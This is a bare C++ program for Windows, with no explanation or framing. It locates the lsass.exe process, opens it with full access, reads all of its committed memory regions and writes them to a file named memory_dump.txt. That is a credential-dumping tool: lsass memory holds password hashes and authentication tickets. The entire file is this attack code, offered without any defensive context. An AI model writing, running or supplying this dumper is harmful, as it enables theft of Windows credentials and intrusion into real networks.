#include <windows.h>
#include <iostream>
#include <fstream>
#include <TlHelp32.h>

DWORD GetProcessIdByName(const char* name) {
    DWORD pid = -1;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process;
    ZeroMemory(&process, sizeof(process));
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (wcscmp(process.szExeFile, L"lsass.exe") == 0) {
                pid = process.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return pid;
}

int main() {
    const char* processName = "lsass.exe";
    DWORD processId = GetProcessIdByName(processName);

    if (processId == -1) {
        std::cout << "Process not found";
        return 1;
    }

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (processHandle == NULL) {
        std::cout << "Could not open process";
        return 1;
    }

    MEMORY_BASIC_INFORMATION meminfo;
    char* addr = 0;
    std::ofstream file("memory_dump.txt", std::ios::binary);

    while (VirtualQueryEx(processHandle, addr, &meminfo, sizeof(meminfo))) {
        if (meminfo.State == MEM_COMMIT && (meminfo.Type == MEM_MAPPED || meminfo.Type == MEM_PRIVATE)) {
            char* buffer = new char[meminfo.RegionSize];
            SIZE_T bytesRead;

            if (ReadProcessMemory(processHandle, addr, buffer, meminfo.RegionSize, &bytesRead)) {
                file.write(buffer, bytesRead);
            }

            delete[] buffer;
        }

        addr += meminfo.RegionSize;
    }

    file.close();
    CloseHandle(processHandle);
    return 0;
}